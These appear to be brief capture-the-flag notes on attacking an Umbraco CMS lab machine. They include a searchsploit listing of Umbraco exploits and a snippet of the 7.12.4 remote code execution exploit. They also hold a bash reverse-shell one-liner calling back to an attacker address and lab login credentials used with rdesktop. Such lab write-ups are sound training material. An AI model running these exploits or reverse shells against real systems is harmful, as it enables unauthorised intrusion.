searchsploit umbraco cms
--------------------------------------------- ---------------------------------
 Exploit Title                               |  Path
--------------------------------------------- ---------------------------------
Umbraco CMS - Remote Command Execution (Meta | windows/webapps/19671.rb
Umbraco CMS 7.12.4 - (Authenticated) Remote  | aspx/webapps/46153.py
Umbraco CMS 7.12.4 - Remote Code Execution ( | aspx/webapps/49488.py
Umbraco CMS 8.9.1 - Directory Traversal      | aspx/webapps/50241.py
Umbraco CMS SeoChecker Plugin 1.9.2 - Cross- | php/webapps/44988.txt
--------------------------------------------- ---------------------------------
Shellcodes: No Results

Trying the 7.12.4 RCE

https://www.exploit-db.com/exploits/49488

Umbraco CMS 7.12.4 - Remote Code Execution aspx/webapps/49488.py

from the exploit

```py
# Go to vulnerable web page
url_xslt = host + "/umbraco/developer/Xslt/xsltVisualize.aspx"
r3 = s.get(url_xslt)
```

http://10.10.206.242/umbraco/developer/Xslt/xsltVisualize.aspx

```
sh -i >& /dev/tcp/10.6.24.127/1337 0>&1
```

so turns out you were never supposed to try and exploit it...

just use the credentials for remote desktop...

```
rdesktop -u SG -p UmbracoIsTheBest! 10.10.206.242
```
